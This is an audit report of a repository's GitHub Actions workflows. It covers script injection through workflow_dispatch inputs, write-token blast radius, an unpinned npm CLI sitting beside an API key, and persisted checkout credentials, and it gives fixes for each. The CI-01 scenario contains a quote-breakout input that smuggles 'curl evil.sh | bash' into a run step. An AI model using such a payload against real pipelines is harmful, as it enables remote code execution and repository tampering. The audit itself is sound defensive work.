# CI / GitHub Actions Supply-Chain Security Audit

- **Scope:** `.github/workflows/` — `weekly-council-audit.yml`, `security-scan.yml`, `quarterly-threat-model.yml`, `workflow-guards.yml`, `large-scale-experiments.yml`
- **Type:** Authorized defensive self-assessment (owner-requested), READ-ONLY on code
- **Repo HEAD at audit:** `63f70fae3a25be97e1e9055d16774dbc8d6ca52f`
- **Date:** 2026-06-23 (+08:00)
- **Threat model:** OWASP/GitHub CI supply-chain (workflow injection, token scope, untrusted-ref + secrets, action pinning, secret exposure, branch-push blast radius, cache/concurrency/timeout hygiene)

---

## Summary Table

| ID | Severity | Location | Title |
|----|----------|----------|-------|
| CI-01 | Medium | `large-scale-experiments.yml:50-51` | `workflow_dispatch` inputs interpolated into `run:` shell (template injection class) |
| CI-02 | Medium | `large-scale-experiments.yml:21-22, 71-91` | `contents: write` + GITHUB_TOKEN push to rolling results branch — blast radius |
| CI-03 | Low | `weekly-council-audit.yml:8-11, 57-72` | `OPENAI_API_KEY` + `contents:write`/`pull-requests:write` in same job running 3rd-party CLI on repo diff |
| CI-04 | Low | `weekly-council-audit.yml:21-24, 90-114` | No `persist-credentials: false`; broad job-level token; PR auto-creation |
| CI-05 | Low | `large-scale-experiments.yml:36-39` | `fetch-depth: 0` checkout retains default-branch credentials (no `persist-credentials: false`) |
| CI-06 | Info | `large-scale-experiments.yml` (whole job) | No per-step secrets, but `git push` relies on auto-injected token persisted by checkout |
| CI-07 | Info | `weekly-council-audit.yml:42` style note | `setup-python` pin comment `# v5` inconsistent with other files' `# v6.2.0` (cosmetic) |

**Cleared (verified, no action):** action pinning (all 20 `uses:`), `pull_request_target` absence, secret-echo absence, `permissions:` present on every workflow, concurrency present on every workflow, timeouts present on every job, untrusted-PR-checkout-with-secrets absence, `quarterly-threat-model.yml` and `workflow-guards.yml` clean.

---

## Findings

### CI-01 — `workflow_dispatch` inputs interpolated directly into `run:` shell
- **Severity:** Medium
- **Location:** `.github/workflows/large-scale-experiments.yml:50-51` (inputs declared `:13-19`)
- **Description:** The `marathon_iterations` and `marathon_max_minutes` `workflow_dispatch` inputs are interpolated with `${{ github.event.inputs.* }}` directly into a `run:` block:
  ```yaml
  --iterations "${{ github.event.inputs.marathon_iterations || '30' }}" \
  --max-minutes "${{ github.event.inputs.marathon_max_minutes || '45' }}"
  ```
  `${{ }}` is expanded by the Actions template engine *before* the shell sees it, so an input value is spliced into the script text. This is the canonical GitHub script-injection sink class. The default-fallback `|| '30'` does not sanitize a *provided* value.
- **Attack scenario:** A user with repo *write* access (the only principals who can fire `workflow_dispatch`) supplies `marathon_iterations` = `30"; curl evil.sh | bash; echo "` (the surrounding double-quotes are closed by the payload). The injected commands run in the job with `contents: write` and the auto-injected `GITHUB_TOKEN`, enabling arbitrary code execution and a push to the results branch. There is no path for an *unauthenticated* attacker (no `pull_request`/`issue` trigger feeds these), which caps severity at Medium rather than Critical.
- **Existing mitigation:** Trigger is `workflow_dispatch` only (no untrusted trigger); inputs are numeric *by intent*; values are quoted (defeats whitespace-only mischief but not quote-breakout). No input validation step.
- **Recommended fix:** Pass inputs via `env:` and reference `"$VAR"` inside the script (env values are not re-parsed by the template engine), and/or validate as integers first, e.g.:
  ```yaml
  env:
    ITER: ${{ github.event.inputs.marathon_iterations || '30' }}
    MAXM: ${{ github.event.inputs.marathon_max_minutes || '45' }}
  run: |
    [[ "$ITER" =~ ^[0-9]+$ ]] || { echo "bad iter"; exit 1; }
    [[ "$MAXM" =~ ^[0-9]+$ ]] || { echo "bad max"; exit 1; }
    python3 .../red_team_marathon.py --iterations "$ITER" --max-minutes "$MAXM" --phase static
  ```

### CI-02 — Rolling-results branch push: `contents: write` + GITHUB_TOKEN blast radius
- **Severity:** Medium
- **Location:** `.github/workflows/large-scale-experiments.yml:21-22` (`permissions: contents: write`), `:71-91` (push step)
- **Description:** The job holds `contents: write` and pushes to `claude/experiments-results` using the auto-injected `GITHUB_TOKEN` (checkout at `:36-39` uses `fetch-depth: 0` and does *not* set `persist-credentials: false`, so the token remains in `.git/config` and authorizes the `git push origin "$RESULTS_BRANCH"` at `:90`). `contents: write` authorizes pushes to *any* non-protected branch, not just the results branch — so any code that executes in this job (see CI-01) can push to other branches.
- **Attack scenario:** Combined with CI-01, an injected command can `git push --force` to any unprotected branch, or amend/poison the rolling results branch consumed by downstream dashboards (cache/result poisoning). Even absent injection, the scope is broader than the task (push one branch) requires.
- **Existing mitigation:** `contents: write` is the minimum *built-in* scope that permits a push (there is no narrower "push to one branch" permission); `concurrency` (`:24-26`, `cancel-in-progress: false`) serializes runs; the step only stages `artifacts/experiments/` (`:82-84`). The default branch should be branch-protected so a force-push to `master` is rejected.
- **Recommended fix:** Confirm `master` (and any release branches) are branch-protected with no GITHUB_TOKEN bypass. Consider pushing results to a dedicated repo/branch via a fine-grained PAT or `actions/upload-artifact` instead of a `contents: write` branch push, shrinking blast radius to artifacts only. Set `persist-credentials: false` on checkout and push with an explicit, narrowly-scoped credential (see CI-05).

### CI-03 — `OPENAI_API_KEY` + write tokens in the council-review job running a 3rd-party CLI on repo diff
- **Severity:** Low
- **Location:** `.github/workflows/weekly-council-audit.yml:8-11` (`contents: write` + `pull-requests: write`), `:57-72` (Codex run with `OPENAI_API_KEY`)
- **Description:** A single job installs `@openai/codex@latest` (`:27`, floating tag — supply-chain note) and runs it with `secrets.OPENAI_API_KEY` (`:59`) over the last 7 commits' diff, while also holding `contents: write` and `pull-requests: write`. The secret, the write-scoped token, and arbitrary third-party CLI code coexist in one job. Trigger is `schedule`/`workflow_dispatch` only — only the default-branch workflow file and trusted commit content are in scope (no untrusted PR content), which keeps this Low.
- **Attack scenario:** A compromised/malicious `@openai/codex@latest` release (floating, unpinned npm dep) executes in a job that has both `OPENAI_API_KEY` and a write-scoped `GITHUB_TOKEN`, enabling secret exfiltration and repo writes. The diff content itself is from trusted master commits, so it is not an injection vector here.
- **Existing mitigation:** No untrusted trigger; the Codex step is `continue-on-error: true` (`:60`) so failures don't gate; the key is referenced via `env`, never echoed (secret-echo rule clears).
- **Recommended fix:** Pin the Codex CLI to an exact version + integrity (`@openai/codex@x.y.z`, lockfile, or `npm ci`) instead of `@latest`. Split the secret-bearing review step into a job with `permissions: contents: read` and move branch/PR creation to a separate job that does *not* see `OPENAI_API_KEY` (least-privilege per job).

### CI-04 — weekly-council-audit checkout persists credentials; broad job-level token
- **Severity:** Low
- **Location:** `.github/workflows/weekly-council-audit.yml:21-24` (checkout, no `persist-credentials: false`), `:74-114` (push + `github-script` PR create)
- **Description:** The checkout (`:21-24`) omits `persist-credentials: false`, so the default `GITHUB_TOKEN` is written to `.git/config` and used by `git push` (`:87`). Permissions are declared once at workflow level (`contents: write`, `pull-requests: write`) and thus apply to the entire job, including the secret-bearing Codex step (compounds CI-03).
- **Attack scenario:** Same blast-radius concern as CI-02 — persisted write token reachable by any step in the job; combined with the floating Codex dependency (CI-03) the persisted token is exposed to third-party code.
- **Existing mitigation:** No untrusted trigger; PR creation via pinned `actions/github-script` with a server-side `pulls.create` (no shell). Branch name derived from `date` (`:47`), not user input — no injection.
- **Recommended fix:** Add `persist-credentials: false` to the checkout and push via an explicit token only in the push step; scope `permissions:` per job so the review job is read-only.

### CI-05 — large-scale-experiments checkout persists credentials (`fetch-depth: 0`)
- **Severity:** Low
- **Location:** `.github/workflows/large-scale-experiments.yml:36-39`
- **Description:** Checkout uses `fetch-depth: 0` and does not set `persist-credentials: false`; the persisted `GITHUB_TOKEN` is what enables the later `git push` (`:90`). This is the mechanism behind CI-02's blast radius.
- **Attack scenario:** Any step executing in the job (incl. CI-01 injection) can reuse the persisted credential for arbitrary pushes within `contents: write` scope.
- **Existing mitigation:** Functionally required today because the workflow pushes via plain `git`. No untrusted trigger.
- **Recommended fix:** Either accept this as a documented requirement of the branch-push design, or migrate to `actions/upload-artifact` and set `persist-credentials: false`. If keeping the push, isolate it in a minimal final step.

### CI-06 — Implicit token reliance for `git push` (Info)
- **Severity:** Info
- **Location:** `.github/workflows/large-scale-experiments.yml` (job-wide); `weekly-council-audit.yml` (job-wide)
- **Description:** Both pushing workflows rely on the implicitly-persisted `GITHUB_TOKEN` rather than an explicit, auditable credential reference. This is functional and standard, but makes the trust path implicit. Noted for hygiene; no exploit beyond CI-02/CI-05.
- **Recommended fix:** Prefer explicit `token:` on checkout or an explicit credential in the push step for auditability.

### CI-07 — Inconsistent pin comment on setup-python (Info / cosmetic)
- **Severity:** Info
- **Location:** `.github/workflows/large-scale-experiments.yml:42` (`# v5`) vs other files (`# v6.2.0`)
- **Description:** All workflows pin `actions/setup-python` to the *same* SHA `a309ff8b426b58ec0e2a45f0f869d46889d02405`, but this file annotates it `# v5` while the others annotate `# v6.2.0`. The SHA — the security-relevant part — is identical and pinned; only the human comment is stale/misleading.
- **Recommended fix:** Normalize the trailing tag comment to match the resolved SHA's actual tag for clarity. No security impact.

---

## Cleared Controls (verified, holding)

| Control | Verification |
|---------|--------------|
| **Action pinning (40-char SHA)** | All 20 `uses:` across the 5 workflows pin to full SHAs: `actions/checkout@de0fac2e...`, `actions/setup-python@a309ff8b...`, `actions/github-script@d746ffe3...`. Enforcement is real: `repo_security_scan.py:110-117` rule `workflow-unpinned-action` regex `^\s*-?\s*uses:\s*[^@\s]+/[^@\s]+@(?!(?:[0-9a-f]{40})(?:\s|$|#)).+` runs over `.github/workflows/` and `template/.github/workflows/` (`STATIC_TARGETS`, scan src `:46-47`) in the `repo-static-scan` job (`security-scan.yml:62-77`) on every PR/push/weekly. Claim verified — pinning holds across every workflow. |
| **No `pull_request_target`** | Absent from all 5 workflows; also actively guarded by `workflow-pull-request-target` rule (`repo_security_scan.py:125-131`). No untrusted-ref checkout with secrets exists. |
| **No untrusted PR checkout + secrets** | The only secret-bearing workflows (`weekly-council-audit` OPENAI_API_KEY; `workflow-guards` GITHUB_TOKEN) trigger on `schedule`/`workflow_dispatch`/`push:master`, never on untrusted `pull_request` with checkout of a PR head. `security-scan.yml` runs on `pull_request` but is `permissions: contents: read`, sets `persist-credentials: false` on every checkout, and references no secrets. |
| **No secret echo** | No `echo ${{ secrets.* }}` anywhere; guarded by `workflow-secret-echo` rule (`repo_security_scan.py:139-145`). Secrets only via `env:` (OPENAI_API_KEY, GITHUB_TOKEN). |
| **`permissions:` present + scoped** | Every workflow declares `permissions:`. `security-scan.yml:14` and `workflow-guards.yml:9-11` are read-only/minimal. `quarterly-threat-model.yml:8-10` is `issues: write`, `contents: read` — correctly scoped to its one job's need. No `write-all` (guarded by rule `:132-138`). |
| **Concurrency** | All 5 workflows declare `concurrency:` groups; PR-facing ones use `cancel-in-progress: true`, push/schedule ones `false` (correct — avoids cancelling a mid-push). |
| **Timeouts** | Every job sets `timeout-minutes` (5–60). No unbounded jobs. |
| **`quarterly-threat-model.yml`** | Clean. `github-script` builds the issue body from *server-side date math only* — no `${{ github.event.* }}` user input reaches the `script:`. `issues: write`/`contents: read` least-privilege. |
| **`workflow-guards.yml`** | Clean. `contents: read`/`pull-requests: read`; `persist-credentials: false`; GITHUB_TOKEN passed via `env` to a status validator (no injection sink); all `run:` blocks use static/derived values only. |

---

## Residual Risk Statement

The dominant residual is **CI-01 → CI-02 chained**: a write-access principal firing `workflow_dispatch` on `large-scale-experiments.yml` can inject shell via the marathon inputs into a `contents: write` job whose checkout persists the GITHUB_TOKEN, yielding RCE + branch push. It is gated to *write-access* actors (no unauthenticated path), so it is an insider/compromised-account hardening item, not an external-attacker vuln. **CI-03** (floating `@openai/codex@latest` co-located with OPENAI_API_KEY + write token) is the main supply-chain item — pin it. Pinning of *GitHub Actions* themselves is fully enforced and verified clean.
